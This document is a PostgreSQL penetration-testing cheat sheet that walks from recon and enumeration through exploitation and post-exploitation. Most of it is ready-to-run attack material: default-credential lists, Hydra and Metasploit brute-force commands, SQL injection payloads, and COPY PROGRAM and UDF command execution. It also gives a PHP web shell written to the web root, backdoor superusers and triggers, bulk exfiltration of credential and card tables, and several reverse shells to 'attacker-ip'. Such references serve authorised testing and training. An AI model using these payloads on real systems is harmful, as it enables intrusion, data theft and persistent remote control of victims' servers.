# PostgreSQL

**`Default Port: 5432`**

**PostgreSQL**, also known as Postgres, is a powerful open-source object-relational database management system (ORDBMS). It emphasizes extensibility and SQL compliance, supporting both SQL (relational) and JSON (non-relational) querying. PostgreSQL is known for its robust feature set, reliability, data integrity, and strong community support. It's widely used in web applications, data warehousing, and as a backend for various enterprise applications.

### Connect <a href="#connect" id="connect"></a>

#### Using psql Client <a href="#using-psql-client" id="using-psql-client"></a>

```
# Local connection
psql -U username

# Remote connection
psql -h target.com -p 5432 -U username -d database_name

# Connect without specifying database
psql -h target.com -U postgres

# Connection with password
psql -h target.com -U username -W

# Execute command directly
psql -h target.com -U username -d database_name -c "SELECT version();"

# Execute commands from file
psql -h target.com -U username -d database_name -f script.sql
```

#### Using pgAdmin (GUI) <a href="#using-pgadmin-gui" id="using-pgadmin-gui"></a>

```
Host: target.com
Port: 5432
Database: postgres
Username: postgres
Password: password
```

#### Connection URL Format <a href="#connection-url-format" id="connection-url-format"></a>

```
postgresql://username:password@hostname:port/database_name
postgresql://postgres:password@target.com:5432/app_db
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect PostgreSQL services and identify server capabilities.

```
nmap -p 5432 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to PostgreSQL servers to gather version and service information.

**Using netcat**

```
# Using netcat
nc -vn target.com 5432
```

**Using nmap**

```
# Using nmap
nmap -p 5432 -sV --script-args pgsql.username=postgres target.com
```

**Using psql**

```
# Using psql
psql -h target.com -U postgres -c "SELECT version();"
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Version Detection <a href="#version-detection" id="version-detection"></a>

Extract PostgreSQL version and server information.

```
# PostgreSQL version
SELECT version();

# Server version number
SHOW server_version;
SHOW server_version_num;

# Detailed version info
SELECT current_setting('server_version');
```

#### Database Enumeration <a href="#database-enumeration" id="database-enumeration"></a>

Enumerating databases helps identify targets containing sensitive information and understand the application architecture.

```
# List all databases
\l
SELECT datname FROM pg_database;

# Current database
SELECT current_database();

# Database owner
SELECT pg_catalog.pg_get_userbyid(d.datdba) AS owner, datname 
FROM pg_catalog.pg_database d;

# Database size
SELECT pg_database.datname, 
       pg_size_pretty(pg_database_size(pg_database.datname)) AS size 
FROM pg_database;

# Number of connections per database
SELECT datname, count(*) FROM pg_stat_activity GROUP BY datname;
```

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Understanding user accounts, their privileges, and roles is crucial for privilege escalation attacks.

```
# List all users
\du
SELECT usename FROM pg_user;
SELECT usename, usesysid FROM pg_shadow;

# Current user
SELECT current_user;
SELECT user;
SELECT session_user;

# User privileges
SELECT usename, usecreatedb, usesuper FROM pg_user;

# Superusers
SELECT usename FROM pg_user WHERE usesuper = true;

# Users with create database privilege
SELECT usename FROM pg_user WHERE usecreatedb = true;
```

#### Schema and Table Enumeration <a href="#schema-and-table-enumeration" id="schema-and-table-enumeration"></a>

Enumerating schemas and tables helps map the database structure and locate sensitive data.

```
# List schemas
\dn
SELECT schema_name FROM information_schema.schemata;

# List tables in current database
\dt
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

# List all tables across all schemas
SELECT schemaname, tablename FROM pg_tables;

# List columns in specific table
\d table_name
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_name='users';

# Find sensitive columns
SELECT table_schema, table_name, column_name 
FROM information_schema.columns 
WHERE column_name LIKE '%password%' 
   OR column_name LIKE '%pass%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%'
   OR column_name LIKE '%key%';

# Count rows in tables
SELECT schemaname, relname, n_live_tup 
FROM pg_stat_user_tables 
ORDER BY n_live_tup DESC;
```

#### Privilege Enumeration <a href="#privilege-enumeration" id="privilege-enumeration"></a>

Analyze user privileges and permissions.

```
# Current user privileges
\du+

# Table privileges for current user
SELECT grantee, privilege_type 
FROM information_schema.table_privileges 
WHERE grantee = current_user;

# Check if superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;

# Check file read/write permissions
# Requires pg_read_file/pg_write_file functions
SELECT has_function_privilege('pg_read_file(text)', 'execute');
SELECT has_function_privilege('pg_ls_dir(text)', 'execute');
```

#### Function and Extension Enumeration <a href="#function-and-extension-enumeration" id="function-and-extension-enumeration"></a>

Discover installed functions and extensions that could be exploited.

```
# List installed extensions
\dx
SELECT extname, extversion FROM pg_extension;

# List functions
\df
SELECT proname FROM pg_proc WHERE proname !~ '^pg_';

# List large objects
\lo_list
SELECT oid, pg_size_pretty(lo_get(oid)) FROM pg_largeobject_metadata;

# Check for dangerous functions
SELECT proname FROM pg_proc 
WHERE proname IN ('pg_read_file', 'pg_ls_dir', 'pg_read_binary_file');
```

#### Configuration Enumeration <a href="#configuration-enumeration" id="configuration-enumeration"></a>

Extract PostgreSQL configuration and settings information.

```
# Important settings
SHOW all;
SHOW data_directory;
SHOW config_file;
SHOW hba_file;
SHOW log_directory;

# File locations
SELECT name, setting FROM pg_settings WHERE name LIKE '%file%' OR name LIKE '%dir%';

# Logging settings
SELECT name, setting FROM pg_settings WHERE name LIKE 'log%';

# Connection settings
SELECT name, setting FROM pg_settings WHERE category = 'Connections and Authentication';
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

PostgreSQL installations often retain default credentials for system accounts.

```
# Common default credentials
postgres:postgres
postgres:<blank>
postgres:password
postgres:admin
admin:admin

# Try with psql
psql -h target.com -U postgres
psql -h target.com -U postgres -W  # Will prompt for password
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute forcing PostgreSQL credentials can reveal weak passwords on systems without account lockout.

**Using Hydra**

```
# Single user
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target.com postgres

# Multiple users
hydra -L users.txt -P passwords.txt target.com postgres
```

**Using Metasploit**

```
use auxiliary/scanner/postgres/postgres_login
set RHOSTS target.com
set USERNAME postgres
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

**Using Nmap**

```
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
```

#### SQL Injection in PostgreSQL Context <a href="#sql-injection-in-postgresql-context" id="sql-injection-in-postgresql-context"></a>

PostgreSQL has unique SQL injection techniques and syntax.

```
# Error-based injection
' AND 1=CAST((SELECT version()) AS int)--

# Union-based injection
' UNION SELECT NULL, version(), NULL--
' UNION SELECT NULL, current_database(), NULL--

# Boolean-based blind
' AND (SELECT COUNT(*) FROM pg_user WHERE usename='postgres')=1--

# Time-based blind
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
'; SELECT pg_sleep(5)--

# Stacked queries (if supported)
'; DROP TABLE test_table;--
```

#### Command Execution via COPY <a href="#command-execution-via-copy" id="command-execution-via-copy"></a>

PostgreSQL's COPY command can be exploited for file operations and command execution.

**Read Files with COPY FROM**

```
CREATE TABLE temp_table(content text);
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;
DROP TABLE temp_table;
```

**Write Files with COPY TO**

```
COPY (SELECT 'malicious content') TO '/tmp/backdoor.txt';
```

**Execute Commands via COPY PROGRAM**

```
COPY (SELECT '') TO PROGRAM 'id > /tmp/command_output.txt';
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1';
```

#### Large Object Exploitation <a href="#large-object-exploitation" id="large-object-exploitation"></a>

Use PostgreSQL large objects for file operations and data storage.

```
# Create large object from file
SELECT lo_import('/etc/passwd', 12345);

# Read large object
SELECT lo_get(12345);
SELECT convert_from(lo_get(12345), 'UTF8');

# Export large object
SELECT lo_export(12345, '/tmp/exported_file');

# Delete large object
SELECT lo_unlink(12345);

# List all large objects
SELECT oid FROM pg_largeobject_metadata;
```

#### pg\_read\_file Exploitation <a href="#pg_read_file-exploitation" id="pg_read_file-exploitation"></a>

Use PostgreSQL file reading functions for filesystem access.

```
# Read files (requires superuser or pg_read_server_files role)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('../../../../../../etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

# Read configuration files
SELECT pg_read_file(current_setting('config_file'));
SELECT pg_read_file(current_setting('hba_file'));

# List directory
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/var/www/html');

# Read binary files
SELECT pg_read_binary_file('/etc/shadow');
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Password Hash Extraction <a href="#password-hash-extraction" id="password-hash-extraction"></a>

Extract PostgreSQL password hashes for offline cracking.

```
# Extract password hashes (requires superuser)
SELECT usename, passwd FROM pg_shadow;

# All user information
SELECT * FROM pg_authid;

# Using pg_dumpall
# From command line
pg_dumpall -h target.com -U postgres --roles-only > roles.sql

# Hashes are in SCRAM-SHA-256 or MD5 format
# Example: SCRAM-SHA-256$4096:salt$hash1:hash2
```

#### Hash Cracking <a href="#hash-cracking" id="hash-cracking"></a>

Crack extracted PostgreSQL password hashes using various tools.

```
# Extract hashes
psql -h target.com -U postgres -c "SELECT usename || ':' || passwd FROM pg_shadow;" > postgres_hashes.txt

# Crack with hashcat (PostgreSQL SCRAM-SHA-256)
hashcat -m 28600 postgres_hashes.txt rockyou.txt

# Crack MD5 (older PostgreSQL)
hashcat -m 0 md5_hashes.txt rockyou.txt

# Crack with John the Ripper
john --format=postgres postgres_hashes.txt
```

#### UDF (User Defined Functions) for RCE <a href="#udf-user-defined-functions-for-rce" id="udf-user-defined-functions-for-rce"></a>

Create and use User Defined Functions for remote code execution.

```
# Create C-based UDF for command execution
# First, compile UDF library

# Upload library
CREATE TABLE temp_udf(data text);
INSERT INTO temp_udf VALUES (pg_read_binary_file('/tmp/lib_postgresqludf_sys.so'));
-- Or use lo_import

# Create function
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;

# Execute commands
SELECT sys_exec('id > /tmp/command_output.txt');
SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');

# Using sqlmap's lib_postgresqludf_sys
# Library provides: sys_exec, sys_eval, sys_bineval
SELECT sys_eval('whoami');
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges to gain full database control.

```
# Create new superuser
CREATE USER backdoor WITH PASSWORD 'P@ssw0rd123!' SUPERUSER;

# Grant superuser to existing user
ALTER USER existing_user WITH SUPERUSER;

# Grant all privileges
GRANT ALL PRIVILEGES ON DATABASE target_db TO backdoor;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO backdoor;

# Become another user (if you have access to pg_authid)
SET ROLE postgres;
SET SESSION AUTHORIZATION postgres;
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to PostgreSQL databases.

```
# Create backdoor superuser
CREATE USER system_admin WITH PASSWORD 'ComplexP@ss123!' SUPERUSER CREATEDB CREATEROLE;

# Create backdoor function
CREATE OR REPLACE FUNCTION backdoor() RETURNS TEXT AS $$
BEGIN
  PERFORM pg_sleep(1);
  RETURN 'OK';
END;
$$ LANGUAGE plpgsql;

# Create trigger for persistence
CREATE OR REPLACE FUNCTION backdoor_trigger() RETURNS TRIGGER AS $$
BEGIN
  -- Execute backdoor code
  PERFORM pg_sleep(1);
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER persistent_backdoor
AFTER INSERT ON some_table
FOR EACH ROW
EXECUTE FUNCTION backdoor_trigger();
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from PostgreSQL databases.

```
# Export sensitive data
COPY (SELECT * FROM users) TO '/tmp/users_data.csv' CSV HEADER;
COPY (SELECT * FROM credit_cards) TO '/tmp/cc_data.csv' CSV HEADER;

# Export with custom delimiter
COPY (SELECT username, password FROM accounts) TO '/tmp/credentials.txt' (DELIMITER ':');

# Export database schema
pg_dump -h target.com -U postgres -s database_name > schema.sql

# Export entire database
pg_dump -h target.com -U postgres database_name > database_backup.sql

# Export all databases
pg_dumpall -h target.com -U postgres > all_databases.sql
```

#### File System Access <a href="#file-system-access" id="file-system-access"></a>

Use PostgreSQL functions to access the underlying filesystem.

```
# Read files
SELECT pg_read_file('/etc/passwd', 0, 1000000);
SELECT pg_read_file('/var/www/html/config.php');

# Write files using COPY
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# Directory listing
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/var/www/html');

# Check file existence
SELECT pg_stat_file('/etc/passwd');
```

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

Establish reverse shell connections using PostgreSQL capabilities.

```
# Using COPY PROGRAM
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"';

# Using UDF
SELECT sys_exec('nc attacker-ip 4444 -e /bin/bash');

# Using Perl
COPY (SELECT '') TO PROGRAM 'perl -e "use Socket;$i=\"attacker-ip\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}"';

# Using Python
COPY (SELECT '') TO PROGRAM 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker-ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"';
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Use compromised PostgreSQL access for lateral movement.

```
# Enumerate network (if UDF available)
SELECT sys_exec('ping -c 1 192.168.1.1');
SELECT sys_exec('nmap -sn 192.168.1.0/24');

# Access other databases with same credentials
psql -h another-host.com -U postgres

# Check for password reuse
# Use extracted credentials on SSH, RDP, other databases
```

#### CVE Exploitation <a href="#cve-exploitation" id="cve-exploitation"></a>

Exploit known PostgreSQL vulnerabilities for privilege escalation and RCE.

```
# CVE-2019-9193 (Authenticated RCE via COPY FROM PROGRAM)
# PostgreSQL 9.3 - 11.2
# Requires SUPERUSER or pg_execute_server_program role

psql -h target.com -U postgres -c "COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'"

# CVE-2018-1058 (Search Path Manipulation)
# Create malicious function in public schema
CREATE FUNCTION array_to_string(anyarray, text) RETURNS TEXT AS $$
BEGIN
  -- Malicious code
  PERFORM pg_sleep(10);
  RETURN '';
END;
$$ LANGUAGE plpgsql;
```

### Common PostgreSQL Commands <a href="#common-postgresql-commands" id="common-postgresql-commands"></a>

| Command                      | Description         | Usage                        |
| ---------------------------- | ------------------- | ---------------------------- |
| `\l`                         | List databases      | `\l`                         |
| `\c`                         | Connect to database | `\c database_name`           |
| `\dt`                        | List tables         | `\dt`                        |
| `\d table`                   | Describe table      | `\d users`                   |
| `\du`                        | List users          | `\du`                        |
| `\dn`                        | List schemas        | `\dn`                        |
| `\df`                        | List functions      | `\df`                        |
| `\dx`                        | List extensions     | `\dx`                        |
| `\q`                         | Quit psql           | `\q`                         |
| `SELECT version();`          | Get version         | `SELECT version();`          |
| `SELECT current_user;`       | Current user        | `SELECT current_user;`       |
| `SELECT current_database();` | Current database    | `SELECT current_database();` |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool            | Description            | Primary Use Case       |
| --------------- | ---------------------- | ---------------------- |
| psql            | PostgreSQL client      | Direct database access |
| pg\_dump        | Database backup        | Data extraction        |
| pg\_dumpall     | Cluster backup         | Complete backup        |
| pgAdmin         | GUI client             | Database management    |
| Metasploit      | Exploitation framework | Automated testing      |
| sqlmap          | SQL injection tool     | Automated exploitation |
| Hydra           | Password cracker       | Brute force attacks    |
| hashcat         | Password recovery      | Hash cracking          |
| John the Ripper | Password cracker       | Hash cracking          |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ Default credentials (postgres:postgres)
* ❌ Weak passwords
* ❌ Superuser accessible remotely
* ❌ pg\_hba.conf allows trust authentication
* ❌ No SSL/TLS encryption
* ❌ Wide open firewall rules
* ❌ Unnecessary extensions installed
* ❌ Logging disabled
* ❌ Outdated PostgreSQL version
* ❌ COPY PROGRAM enabled for non-superusers
* ❌ File system functions accessible
* ❌ No connection limits
